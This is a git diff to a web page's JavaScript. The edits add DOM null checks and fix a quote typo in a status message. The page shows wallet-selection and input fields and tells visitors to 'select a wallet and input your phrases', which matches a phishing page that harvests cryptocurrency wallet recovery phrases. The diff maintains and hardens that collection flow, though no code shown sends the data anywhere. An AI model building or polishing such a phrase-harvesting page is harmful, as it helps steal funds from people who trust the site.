@@ -10,6 +10,11 @@ document.addEventListener('DOMContentLoaded', () => {
     const barcodeContainer = document.getElementById('barcodeContainer');
     const connectButtons = document.querySelectorAll('.connect-button');
 
+    if (!walletSelect || !userInput || !connectWalletButton || !submitSection) {
+        console.error('One or more elements not found:', { walletSelect, userInput, connectWalletButton, submitSection });
+        return;
+    }
+
     // Smooth scroll for navbar links
     document.querySelectorAll('.nav-menu a').forEach(anchor => {
         anchor.addEventListener('click', (e) => {
@@ -29,12 +34,16 @@ document.addEventListener('DOMContentLoaded', () => {
     connectButtons.forEach(button => {
         button.addEventListener('click', () => {
             console.log('Card button clicked:', button.getAttribute('data-option'));
-            walletSelect.style.display = 'block';
-            userInput.style.display = 'block';
-            statusMessage.textContent = `Please select a wallet and input your phrases to ${button.getAttribute('data-option')}.`;
-            connectWalletButton.style.display = 'none';
-            submitSection.style.display = 'none';
-            barcodeContainer.style.display = 'none';
+            if (walletSelect && userInput) {
+                walletSelect.style.display = 'block';
+                userInput.style.display = 'block';
+                statusMessage.textContent = `Please select a wallet and input your phrases to ${button.getAttribute('data-option')}.`;
+                connectWalletButton.style.display = 'none';
+                submitSection.style.display = 'none';
+                barcodeContainer.style.display = 'none';
+            } else {
+                console.error('Wallet select or input not found');
+            }
         });
     });
 
@@ -43,7 +52,7 @@ document.addEventListener('DOMContentLoaded', () => {
         console.log('Wallet selected:', walletSelect.value);
         if (walletSelect.value) {
             connectWalletButton.style.display = 'block';
-            statusMessage.textContent = `Selected ${walletSelect.value}. Click "Connect Wallet" to proceed.';
+            statusMessage.textContent = `Selected ${walletSelect.value}. Click "Connect Wallet" to proceed.`;
         } else {
             connectWalletButton.style.display = 'none';
         }
